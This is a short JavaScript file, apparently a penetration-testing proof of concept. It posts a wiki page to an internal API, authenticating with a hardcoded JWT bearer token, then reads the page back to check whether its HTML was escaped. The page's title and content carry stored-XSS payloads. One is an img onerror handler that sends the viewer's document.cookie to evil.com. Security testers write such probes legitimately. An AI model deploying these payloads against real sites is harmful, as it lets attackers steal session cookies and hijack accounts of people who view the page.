
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3ZWFrdGVzdDQiLCJyb2xlIjoidXNlciIsImV4cCI6MTc4MzU5MTQ2OCwiaWF0IjoxNzgzNTg0MjY4fQ.9MhhhmWDiMRV3urSpqDQdpT5Fv9avmhTdQf8uMf2_5w';

const payload = {
  title: 'XSS Test <img src=x onerror=alert(1)>',
  content: '<script>alert(document.cookie)</script><img src=x onerror=fetch("http://evil.com/?c="+document.cookie)>',
  summary: 'XSS PoC'
};

fetch('http://172.25.30.200:8080/api/wiki', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
}).then(r => r.json()).then(j => {
  console.log('CREATE XSS RESULT:');
  console.log(JSON.stringify(j, null, 2));
  // Now fetch the created page to check if HTML was escaped
  const pageId = j.page ? j.page.id : (j.id || 'unknown');
  return fetch('http://172.25.30.200:8080/api/wiki/' + pageId, {
    headers: { 'Authorization': 'Bearer ' + token }
  }).then(r => r.json()).then(detail => {
    console.log('\nFETCHED PAGE CONTENT:');
    console.log('Title:', detail.title);
    console.log('Content:', detail.content);
  });
});
